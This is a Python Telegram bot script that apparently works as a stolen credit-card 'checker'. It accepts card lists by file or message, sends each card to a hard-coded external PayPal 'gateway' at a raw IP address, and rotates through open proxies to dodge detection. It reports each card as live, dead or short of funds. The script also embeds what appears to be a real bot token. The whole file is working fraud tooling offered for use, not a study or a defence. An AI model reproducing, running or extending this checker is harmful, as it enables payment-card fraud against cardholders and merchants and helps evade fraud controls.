from telebot import TeleBot
import requests
import time

bot = TeleBot("8663863938:AAG1yVZYZLrbRcSIWLBiN7MJFqnmV3i2CqE")

GATEWAY = "http://138.128.240.15:8024/paypal_1?cc="

proxies_list = [
    "http://148.230.4.241:999",
    "http://2.78.60.10:3129",
    "http://1.231.81.166:3128",
    "http://45.167.124.71:999",
    "http://103.157.200.126:3128",
    "http://80.92.204.47:1081"
]

current_proxy = 0

def get_proxy():
    global current_proxy
    proxy = proxies_list[current_proxy % len(proxies_list)]
    current_proxy += 1
    return {"http": proxy, "https": proxy}

@bot.message_handler(commands=['start'])
def start(m):
    bot.send_message(m.chat.id, "✅ **Full Proxy + File Checker ON**")

@bot.message_handler(commands=['chk'])
def chk_file(m):
    bot.send_message(m.chat.id, "📁 Cards wali .txt file bhej")

@bot.message_handler(content_types=['document'])
def handle_txt(m):
    if not m.document.file_name.endswith('.txt'):
        bot.reply_to(m, "Sirf .txt file bhej")
        return

    file_info = bot.get_file(m.document.file_id)
    downloaded = bot.download_file(file_info.file_path)
    cards = [line.strip() for line in downloaded.decode('utf-8').splitlines() if line.strip()]

    bot.send_message(m.chat.id, f"🔄 {len(cards)} cards check shuru...\nProxy rotation ON")

    live = 0
    dead = 0
    msg = bot.send_message(m.chat.id, "Processing...")

    for i, card in enumerate(cards):
        proxy = get_proxy()
        bot.edit_message_text(f"🔄 Checking {i+1}/{len(cards)}\n🌐 Proxy: {proxy['http']}\nCurrent: {card[:12]}****", m.chat.id, msg.message_id)

        try:
            url = GATEWAY + card.replace(" ", "")
            r = requests.get(url, proxies=proxy, timeout=20)
            resp = r.text.lower()

            if any(x in resp for x in ["approved", "success", "charged", "live"]):
                live += 1
                bot.send_message(m.chat.id, f"✅ **LIVE**\n{card}")
            elif any(x in resp for x in ["insufficient", "funds"]):
                bot.send_message(m.chat.id, f"⚠️ **INSUFFICIENT FUNDS**\n{card}")
            else:
                dead += 1

        except:
            dead += 1
            time.sleep(1)

    bot.edit_message_text(f"✅ **COMPLETE**\n✅ Live: {live}\n❌ Dead: {dead}\nTotal: {len(cards)}", m.chat.id, msg.message_id)

@bot.message_handler(func=lambda m: True)
def single_check(m):
    for line in m.text.splitlines():
        line = line.strip()
        if not line: continue
        # same check logic as above (with proxy)
        proxy = get_proxy()
        try:
            url = GATEWAY + line.replace(" ", "")
            r = requests.get(url, proxies=proxy, timeout=20)
            resp = r.text.lower()
            if any(x in resp for x in ["approved", "success", "charged", "live"]):
                bot.reply_to(m, f"✅ **LIVE**\n{line}")
            elif any(x in resp for x in ["insufficient", "funds"]):
                bot.reply_to(m, f"⚠️ **INSUFFICIENT**\n{line}")
        except:
            pass

bot.infinity_polling()
